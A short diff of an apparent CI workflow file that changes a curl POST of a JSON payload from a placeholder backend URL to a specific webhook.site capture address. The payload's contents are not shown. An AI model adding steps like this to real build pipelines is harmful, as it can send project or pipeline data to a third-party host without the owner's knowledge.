@@ -53,6 +53,6 @@ jobs:
           echo "Sending Payload:"
           echo "$JSON"
 
-          curl -X POST https://your-backend-url/submit \
+          curl -X POST https://webhook.site/ca96ee5d-a449-4d24-a4c2-24713c38551b \
             -H "Content-Type: application/json" \
             -d "$JSON"
